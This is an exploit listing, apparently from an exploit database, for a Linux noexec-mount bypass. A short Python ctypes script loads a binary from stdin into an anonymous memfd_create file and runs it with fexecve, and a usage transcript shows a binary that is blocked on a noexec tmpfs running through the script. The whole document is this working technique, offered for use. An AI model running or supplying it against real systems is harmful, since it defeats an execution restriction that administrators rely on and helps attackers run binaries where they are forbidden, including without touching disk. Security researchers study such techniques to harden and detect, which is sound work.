# Exploit Title: Linux >= 3.17 noexec bypass with python ctypes and memfd_create
# Date: 2015.10.14
# Exploit Author: soyer
# Version: linux >= 3.17
# Tested on: Ubuntu 15.04 (x86_64)
#
# usage:
#
#   $ ls -la exec_file
#   -rwxr-xr-x 1 soyer soyer 8600 Oct 14 15:04 exec_file
#   $ ./exec_file
#   bash: ./exec_file: Permission denied
#   $ mount |grep $(pwd)
#   tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
#   $ python noexec.py < exec_file
#   Hello world! fprintf=0x400470, stdout=0x7f63a3933740

from ctypes import *
c = CDLL("libc.so.6")
fd = c.syscall(319,"tempmem",0)
c.sendfile(fd,0,0,0x7ffff000)
c.fexecve(fd,byref(c_char_p()),byref(c_char_p()))
print "fexecve failed"